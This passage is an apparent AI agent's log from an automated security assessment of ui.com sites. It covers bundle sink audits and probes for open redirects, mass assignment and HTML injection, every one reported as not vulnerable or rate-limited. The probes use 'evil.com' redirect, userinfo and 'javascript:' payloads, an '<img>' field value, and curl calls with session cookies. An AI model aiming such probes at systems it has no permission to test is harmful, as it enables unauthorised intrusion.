+            if 'www' in str(k).lower(): print(p+'/'+str(k), '->', str(v)[:200])
+            walk(v,p+'/'+str(k))
+walk(d)
+PY
+total 32
+drwxr-xr-x 3 runner runner 4096 Nov 28 07:27 .
+drwxr-xr-x 4 runner runner 4096 Nov 28 07:27 ..
+-rw-r--r-- 1 runner runner  488 Nov 28 07:27 flows.md
+drwxr-xr-x 3 runner runner 4096 Nov 28 07:27 javascript
+-rw-r--r-- 1 runner runner  471 Nov 28 07:27 listeners.md
+-rw-r--r-- 1 runner runner  885 Nov 28 07:27 route-report.md
+-rw-r--r-- 1 runner runner 1068 Nov 28 07:27 sinks.md
+-rw-r--r-- 1 runner runner 1071 Nov 28 07:27 sources.md
+---
+flows.md
+javascript
+listeners.md
+route-report.md
+sinks.md
+sources.md
+=== inventory www keys ===
+<class 'dict'> ['targets', 'routes', 'javascript', 'flows', 'endpoints', 'listeners']
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "=== www route-report.md ==="; cat result/client-side/www.ui.com/home/route-report.md
+echo "=== www javascript dir ==="; ls -R result/client-side/www.ui.com/home/javascript | head -20
+echo "=== inventory javascript (www) ==="
+python3 - <<'PY'
+import json
+d=json.load(open('result/testing-inventory.json'))
+for j in d.get('javascript',[]):
+    s=json.dumps(j)
+    if 'www.ui.com' in s or 'www' in s.lower():
+        print(json.dumps(j,indent=1)[:1200]); print('---')
+PY
+=== www route-report.md ===
+# Route Report — https://www.ui.com/ (home)
+
+- Tested: 2026-11-11T05:52–05:54Z
+- Auth: unauthenticated
+- JS reviewed: 7 same-origin bundles (see `javascript/manifest.md`)
+- Phases: sources, sinks, flows, postMessage listeners
+
+## Findings
+None. The marketing microsite is a statically configured React app:
+- no URL/query parameter is read into a DOM/navigation sink,
+- the only redirect component (`vg`) consumes static route config,
+- `dangerouslySetInnerHTML` uses bundled i18n/menu strings only,
+- no in-scope postMessage listener.
+
+## Server-side
+Only public/static assets and third-party analytics were loaded. The app calls
+`sso.ui.com/api/sso/v1/user/self` (401, expected) and `megaphone.svc.ui.com/v1/announcements`
+(401). No new in-scope authenticated API surface. Out-of-scope third-party hosts recorded
+in `result/out-of-scope.txt`.
+
+## Status: Done (no vulnerability)
+=== www javascript dir ===
+result/client-side/www.ui.com/home/javascript:
+manifest.md
+snippets
+
+result/client-side/www.ui.com/home/javascript/snippets:
+i18n-dangerouslySetInnerHTML.txt
+static-redirect-component.txt
+=== inventory javascript (www) ===
+{
+ "url": "https://www.ui.com/microsite/static/index-D-lz99wc.js",
+ "sha256": "851df604e5c21167cf0149398de31407dcef62953a4882c26ab5958e348f9ec2",
+ "tested": true,
+ "notes": "www home: sources/sinks reviewed; no URL-driven flow"
+}
+---
+{
+ "url": "https://www.ui.com/microsite/static/Landing-BaDyOaz_.js",
+ "sha256": "be75267c9ec1564ff7bc6314b897dfce964aa0a554003976d6ea374d317be719",
+ "tested": true,
+ "notes": "www home: no sinks"
+}
+---
+{
+ "url": "https://www.ui.com/microsite/static/layout-CgCwx8Gc.js",
+ "sha256": "2e611cc883b237f44314bd83bc5b361ef35498a8df146f8fca4c0c8ea6709f7a",
+ "tested": true,
+ "notes": "www home: no sinks"
+}
+---
+{
+ "url": "https://www.ui.com/microsite/static/index-BfxHSOgp.js",
+ "sha256": "0722ab3b72947505fffdf3b406b68d957e204215c00a26489eba112c8eae58f9",
+ "tested": true,
+ "notes": "Session 15/16 www build; static/i18n HTML sinks; download link https+allowlist"
+}
+---
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+python3 - <<'PY'
+import json
+d=json.load(open('result/testing-inventory.json'))
+print(json.dumps(d.get('targets'),indent=1)[:3000])
+PY
+echo "=== manifest.md ==="; cat result/client-side/www.ui.com/home/javascript/manifest.md
+[
+ "ui.com"
+]
+=== manifest.md ===
+# JS Manifest — www.ui.com (home route)
+
+Retrieved 2026-11-11T05:52Z from `https://www.ui.com/microsite/static/`.
+Route-related JS only (the home route actually loads these).
+
+| File | SHA256 | Bytes |
+|------|--------|-------|
+| index-D-lz99wc.js | 851df604e5c21167cf0149398de31407dcef62953a4882c26ab5958e348f9ec2 | 934067 |
+| Landing-BaDyOaz_.js | be75267c9ec1564ff7bc6314b897dfce964aa0a554003976d6ea374d317be719 | 155440 |
+| layout-CgCwx8Gc.js | 2e611cc883b237f44314bd83bc5b361ef35498a8df146f8fca4c0c8ea6709f7a | 28921 |
+| helpers-By32CP0d.js | 3eb32c79e2c10dbc363870a28361fad71c786794d851595c1cf92f37ff08a48e | 19806 |
+| constants-CYpkiLT8.js | a18f2633a2bff824ba9bd3555dcd9fbb413dc388fb5874ac87f694e73ca3acc3 | 37340 |
+| dist-DhWTjtFu.js | af97d39962d21d2bbc3d223fae1aa5acdb60315f8829b57d9178132a910be8c1 | 3419 |
+| utils-Bywh4qkr.js | 12c9d4bd3e314d1a7633f77c67ebe711477a69a9ecdcf52c9013e7c5293a444a | 5529 |
+
+Same-origin assets only. Third-party analytics/consent (OneTrust, GTM, Hotjar, Reddit,
+VWO) are out of scope and were not analysed.
+[0m
+[0m← [0mEdit result/progress.md
+Index: /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/progress.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/progress.md
++++ /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/progress.md
+@@ -906,5 +906,25 @@
+   dl.ui.com/fw-download.ubnt.com). Client-side: Not Vulnerable.
+ - Fresh Account A + Account B sessions established end-to-end (password -> email
+   OTP via Maildrop GraphQL -> `/login/2fa` 200 -> `UBIC_AUTH`); `/user/self` 200 for
+   both. (Tokens not copied into files.)
+-- Ongoing: Site Manager bundle check + targeted untested-endpoint tests.
++- Site Manager (`unifi.ui.com`) bundles unchanged vs S31–S33 (`main-0.b06362b8…`,
++  `main-7.8d401a…`, runtime `393f084b…`).
++- Runtime (Chrome MCP) download `?link=` allowlist on new deploy rejects external
++  (`https://evil.com`), userinfo (`https://dl.ui.com@evil.com`), and `javascript:`
++  values (query stripped, no `evil.com` anchor/iframe). 404/slug paths not reflected;
++  `_next/image`/`_next/data`/`/api/` 404; no real Server Actions (single
++  `createServerReference` = RSC runtime definition, no action IDs).
++- `sso /zendesk_login?return_to=<x>`: sso forwards `return_to` verbatim, but Zendesk
++  normalizes the hop to `help.ui.com/access/return_to?...&return_to=https://help.ui.com/hc`
++  (302); single-use JWT not exposed to attacker. No open redirect. `jwt/token`,
++  `shopify_login`, `logout`, `account /login?redirect=` all fixed/no-redirect.
++- Zendesk create mass-assignment variants (`requester_id`=B, `organization_id`,
++  `assignee_id`, `status`, `priority`, `collaborators`) -> `400 BAD_REQUEST`;
++  create quota `x-ratelimit-limit: 1` exhausted (reset ~2026-11-28T08:46Z). No ticket
++  created/persisted. **Unresolved (rate-limited)**, not a finding.
++- `PUT sso /user/self {"picture":"https://example.com/s34.png"}` -> 204 but `picture`
++  unchanged (server-managed). `{"first_name":"<img ...>"}` -> `429`, unchanged;
++  restored. No mass assignment.
++- Status: **57 routes unchanged (42 done / 15 blocked)**. No new high-impact finding;
++  `confirmed-vuln.txt` unchanged; no Discord notification.
++- Ledger: `result/server-side/account.ui.com/session34-ledger.md`.
+
+[0m
+[0m← [0mEdit result/logs/session.md
+Index: /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/logs/session.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/logs/session.md
++++ /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/logs/session.md
+@@ -751,4 +751,31 @@
+ - Continuation (decision=preserved, target_hash 3353d9c6...).
+ - MCP chrome-devtools: available (list_pages OK).
+ - Build check: account.ui.com still `assets/index-D7cQ-F1j.js` (unchanged vs S33).
+   www.ui.com REDEPLOYED `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was e1f4c3c3...).
++  activate.ui.com unchanged `assets/index-1CNh1WqS.js`; unifi.ui.com Site Manager bundles
++  unchanged (`main-0.b06362b8…`, `main-7.8d401a…`, runtime `393f084b…`).
++- www new deploy audited: 36 initial chunks (3.0 MB). Sinks 28 `dangerouslySetInnerHTML`
++  (React/Next internals + static i18n; app route-allowlist chunk `02aqcd17vx73t.js`
++  unchanged), 7 `.innerHTML=` (React setter, GTM, SendSafely, textContent helper); 0
++  insertAdjacentHTML/document.write/eval/new Function/srcdoc. Only app-consumed query
++  param is `appview` (rest are Next RSC internals). No app-level `message` listener.
++  No real Server Actions (single `createServerReference` = RSC runtime definition).
++  `_next/image`/`_next/data`/`/api/` -> 404; 404/slug paths not reflected.
++- Runtime Chrome MCP on `/download/unifi/download-started`: `?link=https://evil.com/s34.zip`
++  and `?link=https://dl.ui.com@evil.com/s34.zip` are stripped (no evil anchor/iframe,
++  `hasEvil:false`); allowlist holds. Client-side: Not Vulnerable.
++- Fresh A + B email-OTP sessions; both `/user/self` 200.
++- `sso /zendesk_login?return_to=https://example.com/x`: sso forwards `return_to` verbatim,
++  but the Zendesk hop 302s to `help.ui.com/access/return_to?...&return_to=https://help.ui.com/hc`
++  (normalized); single-use JWT not exposed. `jwt/token?redirect=evil` 200 (no redirect),
++  `shopify_login`/`logout`/`account /login?redirect=` fixed/no redirect. No open redirect.
++- `POST account.svc /zendesk/ticket` mass-assignment variants (`requester_id`=B,
++  `organization_id`, `assignee_id`, `status`, `priority`, `collaborators`) -> `400
++  BAD_REQUEST`; `x-ratelimit-limit: 1` exhausted (reset ~08:46Z). No ticket persisted.
++  **Unresolved (rate-limited)**.
++- `PUT sso /user/self {"picture":...}` -> 204 but `picture` unchanged (server-managed);
++  `{"first_name":"<img ...>"}` -> `429`, unchanged, restored. No mass assignment.
++- Route ledger unchanged **57 routes (42 done / 15 blocked)**. No new high-impact finding;
++  `confirmed-vuln.txt` unchanged; no Discord notification.
++- Ledger: result/server-side/account.ui.com/session34-ledger.md
++== session end 2026-11-28T07:40:00Z ==
+
+[0m
+[0m← [0mEdit result/SUMMARY.md
+Index: /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/SUMMARY.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/SUMMARY.md
++++ /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/SUMMARY.md
+@@ -605,4 +605,33 @@
+ - Route ledger unchanged: **57 routes (42 done / 15 blocked)**. No new confirmed high-impact
+   finding; `confirmed-vuln.txt` unchanged; no Discord notification.
+   Ledger: `result/server-side/account.ui.com/session33-ledger.md`;
+   evidence `result/server-side/account.ui.com/traffic/session33-newtests.txt`.
++
++## Session 34 (2026-11-28T07:30Z; continuation, decision=preserved)
++- **Build delta:** `account.ui.com` unchanged `assets/index-D7cQ-F1j.js` (sha256
++  `f75b4c9c…303a`, same as S33). `www.ui.com` **redeployed**
++  `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was `e1f4c3c3…`). `activate.ui.com`
++  unchanged `index-1CNh1WqS.js`; Site Manager (`main-0.b06362b8…`, `main-7.8d401a…`,
++  runtime `393f084b…`) unchanged.
++- **www new deploy audit** (36 initial chunks, 3.0 MB): 28 `dangerouslySetInnerHTML`
++  (React/Next internals + static i18n; app route-allowlist `02aqcd17vx73t.js` unchanged),
++  7 `.innerHTML=` (React setter/GTM/SendSafely/textContent); 0 insertAdjacentHTML/
++  document.write/eval/new Function/srcdoc. Only app-consumed query param is `appview`;
++  no app-level `message` listener; no real Server Actions. `_next/image`, `_next/data`,
++  `/api/` -> 404; 404/slug paths not reflected. Runtime `?link=` allowlist on
++  `/download/unifi/download-started` rejects external/userinfo/`javascript:` values.
++  **Not Vulnerable.**
++- Fresh A + B email-OTP sessions (`/user/self` 200).
++- **`sso /zendesk_login?return_to=<x>`**: sso forwards `return_to` verbatim, but Zendesk
++  normalizes the hop to `help.ui.com/access/return_to?...&return_to=https://help.ui.com/hc`
++  (302); single-use JWT not exposed. `jwt/token`, `shopify_login`, `logout`,
++  `account /login?redirect=` all fixed/no-redirect. **No open redirect.**
++- **Zendesk create mass-assignment** (`requester_id`=B, `organization_id`, `assignee_id`,
++  `status`, `priority`, `collaborators`) -> `400 BAD_REQUEST`; create quota
++  (`x-ratelimit-limit: 1`) exhausted (reset ~08:46Z). No ticket persisted.
++  **Unresolved (rate-limited).**
++- `PUT sso /user/self {"picture":...}` ignored (server-managed); `{"first_name":"<img…>"}`
++  -> `429`, unchanged, restored. No mass assignment.
++- Route ledger unchanged: **57 routes (42 done / 15 blocked)**. No new confirmed high-impact
++  finding; `confirmed-vuln.txt` unchanged; no Discord notification.
++  Ledger: `result/server-side/account.ui.com/session34-ledger.md`.
+
+[0m
+[0m← [0mEdit result/client-side/www.ui.com/home/route-report.md
+Index: /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/client-side/www.ui.com/home/route-report.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/client-side/www.ui.com/home/route-report.md
++++ /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/client-side/www.ui.com/home/route-report.md
+@@ -18,4 +18,17 @@
+ (401). No new in-scope authenticated API surface. Out-of-scope third-party hosts recorded
+ in `result/out-of-scope.txt`.
+ 
+ ## Status: Done (no vulnerability)
++
++## Session 34 re-audit (2026-11-28) — new deploy `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14`
++- Re-deploy of the marketing microsite (previous `dpl=e1f4c3c3…`). Audited the 36
++  initial chunks (3.0 MB): 28 `dangerouslySetInnerHTML` (React/Next internals + static
++  i18n; the app route-allowlist chunk `02aqcd17vx73t.js` is unchanged), 7 `.innerHTML=`
++  (React setter, GTM, SendSafely, textContent helper); 0 insertAdjacentHTML/document.write/
++  eval/new Function/srcdoc. Only app-consumed query param is `appview`; the rest are Next
++  RSC internals. No app-level `message` listener. No real Server Actions.
++- `_next/image`, `_next/data`, `/api/` -> 404; 404 and `/download/software/<slug>` paths
++  are not reflected. Runtime (Chrome MCP) `?link=` allowlist on
++  `/download/unifi/download-started` strips `https://evil.com/…` and
++  `https://dl.ui.com@evil.com/…` (no evil anchor/iframe).
++- Status: **Not Vulnerable** (content/dependency refresh; no new sink).
+
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "=== residual 'Ongoing' in progress ==="; grep -n "Ongoing" result/progress.md || echo none
+echo "=== session.md Session34 markers ==="; grep -n "Session 34\|session end 2026-11-28" result/logs/session.md
+echo "=== SUMMARY Session34 ==="; grep -n "## Session 34" result/SUMMARY.md
+echo "=== unresolved.md tail ==="; tail -25 result/unresolved.md
+echo "=== git status ==="; git status --short
+=== residual 'Ongoing' in progress ===
+none
+=== session.md Session34 markers ===
+750:## Session 34 start 2026-11-28T07:28:46Z
+781:== session end 2026-11-28T07:40:00Z ==
+=== SUMMARY Session34 ===
+610:## Session 34 (2026-11-28T07:30Z; continuation, decision=preserved)
+=== unresolved.md tail ===
+  (`No SessionMetadata matches`), B's trusted device -> 404, B's TOTP/email authenticator ->
+  404 (B MFA unchanged); `POST`/`DELETE` B's picture -> 403 `mismatching UUID` (`PUT` 405).
+- SSO `verify`/`verification-code`/`search`/`password` POST bodies return 404 on `sso.ui.com`
+  because the current bundle's SSO base is `sso.ubnt.com` (out of scope); registration
+  (`/api/sso/v2/users`) still requires the private key + captcha + devicecheck attestation.
+- No server-side HTML reflection of markers on account/sso/activate; `www.ui.com` 404 reflects
+  the URL only inside escaped `content=` meta attributes. The credentialed-CORS item (1)
+  therefore still has no attacker-controlled `*.ui.com` origin and remains **blocked**.
+- **Passkey/WebAuthn (Session 32):** `POST /api/sso/v1/user/self/mfa/webauthn` is L2-gated
+  (L1 -> 499 `L2_REQUIRED`), so a password-only/pre-MFA session cannot enroll a passkey to
+  bypass email OTP. An L2 request creates a `pending` authenticator, but
+  `/mfa/webauthn/options` returns 404 (`User or verified keys not found`) and the pending key
+  is not usable for login. Test key deleted afterwards. Not Vulnerable.
+
+## 20. Session 33 — new in-scope endpoints tested; one residual unresolved
+- `POST account.svc /chat/messaging/jwt` and `GET/POST account.svc /zendesk/user` are
+  session-derived and ignore all client-supplied identity/role fields; pre-MFA/no-auth
+  denied. Not Vulnerable (see session33 ledger).
+- **Residual Unresolved:** `GET cloudaccess.svc /devices/{deviceId}/application-devices`
+  requires SigV4/STS (`403 Missing Authentication Token` with a cookie) and Account A owns no
+  devices, so a cross-tenant/IDOR test could not be performed. No object was created and no
+  real user identifiers were guessed. Recorded as Unresolved, not a finding.
+- Site Manager same-origin `/api/...` strings are SPA `index.html` fallbacks on
+  `unifi.ui.com`; the real API bases are out-of-scope `*.svc.ui.com` hosts / console
+  `/proxy/` routes, so they are not directly callable in-scope endpoints.
+=== git status ===
+ M result/SUMMARY.md
+ M result/client-side/www.ui.com/home/route-report.md
+ M result/logs/opencode.log
+ M result/logs/session.md
+ M result/logs/target-state.txt
+ M result/progress.md
+?? result/server-side/account.ui.com/session34-ledger.md
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+cat >> result/unresolved.md <<'EOF'
+
+## 21. Session 34 — www redeploy clean; Zendesk-create mass assignment rate-limited
+- `www.ui.com` redeployed (`dpl=d6fbc335…`); 36 initial chunks re-audited — no new
+  source→sink, no app `message` listener, no Server Actions, `?link=` allowlist holds
+  at runtime. Not Vulnerable.
+- `sso /zendesk_login?return_to=<x>` forwards `return_to` verbatim but Zendesk normalizes
+  the hop to `help.ui.com/hc` (302); single-use JWT not exposed. No open redirect.
+- **Residual Unresolved:** `POST account.svc /zendesk/ticket` mass-assignment variants
+  (`requester_id`=B, `organization_id`, `assignee_id`, `status`, `priority`,
+  `collaborators`) returned `400 BAD_REQUEST`, and the create quota
+  (`x-ratelimit-limit: 1`) was then exhausted (reset ~2026-11-28T08:46Z), so the variant
+  could not be retried. No ticket was created or persisted. Recorded as Unresolved
+  (rate-limited), not a finding.
+- `PUT sso /user/self` `picture` (external URL) is ignored (server-managed); HTML
+  `first_name` returned `429` and was not persisted. No mass assignment.
+EOF
+echo "appended"; tail -3 result/unresolved.md
+appended
+  (rate-limited), not a finding.
+- `PUT sso /user/self` `picture` (external URL) is ignored (server-managed); HTML
+  `first_name` returned `429` and was not persisted. No mass assignment.
+[0m
+Adding the new-deploy chunk manifest as evidence (hashes/sizes from the audited set).
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+OUT=result/client-side/www.ui.com/home/javascript/manifest-session34.md
+{
+  echo "# JS Manifest — www.ui.com new deploy (Session 34)"
+  echo
+  echo "Deploy \`dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14\`; retrieved 2026-11-28T07:30Z."
+  echo "36 initial chunks referenced by \`https://www.ui.com/\` (Next.js 16.4.6 + Turbopack)."
+  echo "Sink counts: dangerouslySetInnerHTML 28, innerHTML 7, insertAdjacentHTML/document.write/eval/new Function/srcdoc 0."
+  echo
+  echo "| File | SHA256 | Bytes |"
+  echo "|------|--------|-------|"
+  cd /tmp/s34/wwwjs
+  for f in $(ls -1 | sort); do
+    s=$(sha256sum "$f" | cut -d' ' -f1); b=$(stat -c%s "$f")
+    echo "| $f | $s | $b |"
+  done
+} > "/home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/$OUT"
+cd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "written: $OUT"; wc -l "$OUT"; head -8 "$OUT"
+written: result/client-side/www.ui.com/home/javascript/manifest-session34.md
+44 result/client-side/www.ui.com/home/javascript/manifest-session34.md
+# JS Manifest — www.ui.com new deploy (Session 34)
+
+Deploy `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14`; retrieved 2026-11-28T07:30Z.
+36 initial chunks referenced by `https://www.ui.com/` (Next.js 16.4.6 + Turbopack).
+Sink counts: dangerouslySetInnerHTML 28, innerHTML 7, insertAdjacentHTML/document.write/eval/new Function/srcdoc 0.
+
+| File | SHA256 | Bytes |
+|------|--------|-------|
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+echo "=== A state ==="
+curl -sS --max-time 15 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o a.json -w "self=%{http_code}\n"
+python3 -c 'import json;d=json.load(open("a.json"));print({k:d.get(k) for k in ("uuid","username","first_name","last_name","email","picture","twofa_enabled","assurance_level")})'
+echo "=== B state ==="
+curl -sS --max-time 15 -b B.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o b.json -w "self=%{http_code}\n"
+python3 -c 'import json;d=json.load(open("b.json"));print({k:d.get(k) for k in ("uuid","username","first_name","email","twofa_enabled","assurance_level")})'
+echo "=== A MFA authenticators (email intact) ==="
+curl -sS --max-time 15 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self/mfa -o mfa.json -w "%{http_code}\n"
+head -c 400 mfa.json; echo
+echo "=== target-state ==="; cat /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/logs/target-state.txt 2>/dev/null | head -20
+=== A state ===
+self=200
+{'uuid': 'd8946fad-2b8e-4cf0-82c5-5d955b57b829', 'username': 'testttt12', 'first_name': 'OpenCodeTest', 'last_name': None, 'email': 'tan.tiger5564@maildrop.cc', 'picture': 'https://account-cdn.svc.ui.com/dee2279c-dde7-4fa9-91cb-1e3d971609ea', 'twofa_enabled': True, 'assurance_level': None}
+=== B state ===
+self=200
+{'uuid': '7c5aab2b-e568-40de-a7a5-ec27df1db94b', 'username': 'test-account-b', 'first_name': None, 'email': 'overrated.chinchilla337@maildrop.cc', 'twofa_enabled': True, 'assurance_level': None}
+=== A MFA authenticators (email intact) ===
+200
+{"authenticators":[{"id":"ae514c45-64ea-46cf-a444-e86c845282e7","created":"2026-11-10T16:11:56.400613Z","last_success":null,"type":"backup_code","status":"backup","codes_left":10},{"id":"b82c4c7d-f733-44c1-b6db-ffa6d5f8183b","created":"2025-01-12T17:14:04.887943Z","last_success":"2026-11-28T07:34:00.144070Z","type":"email","status":"active","blocked_reason":null,"email":"tan.tiger5564@maildrop.cc"
+=== target-state ===
+run_id=42837084733
+event=schedule
+timestamp=2026-11-10T14:44:47Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=575c39e0a7294a2ae908629c606dc88d7fb008e1df9a2b9e5c26fcdaeae79c1e
+decision=reset
+---
+run_id=42843791805
+event=workflow_dispatch
+timestamp=2026-11-10T15:24:01Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=42850898064
+event=workflow_dispatch
+timestamp=2026-11-10T16:05:06Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+[0m
+Session 34 complete; no new high-impact finding. Summary of what was done:
+
+- **Builds:** `account.ui.com` unchanged (`index-D7cQ-F1j.js`, same sha256 as S33); `www.ui.com` redeployed `dpl=d6fbc335…`; `activate.ui.com` and Site Manager bundles unchanged.
+- **www redeploy audit (36 chunks):** no new source→sink, no app `message` listener, no real Server Actions; runtime `?link=` allowlist rejects external/userinfo/`javascript:`; `_next/image|data`/`/api` 404; 404/slug paths not reflected. Not Vulnerable.
+- **Redirects:** `zendesk_login` forwards `return_to` but Zendesk normalizes to `help.ui.com/hc`; `jwt/token`, `shopify_login`, `logout`, `account /login?redirect=` all fixed. No open redirect.
+- **Mass assignment:** Zendesk ticket create variants → `400` then rate-limited (`limit 1`, reset ~08:46Z); `picture` ignored; HTML `first_name` → `429` and not persisted (restored). No finding.
+- **State:** A/B sessions valid, A first_name/picture/MFA intact.
+- **Docs updated:** `progress.md`, `logs/session.md` (session end), `SUMMARY.md`, `unresolved.md` (§21), new `session34-ledger.md`, www `route-report.md` + `manifest-session34.md`.
+
+Only pending item is the rate-limited Zendesk-create mass-assignment retry after ~08:46Z; nothing else actionable since the account build is unchanged. Stopping here.
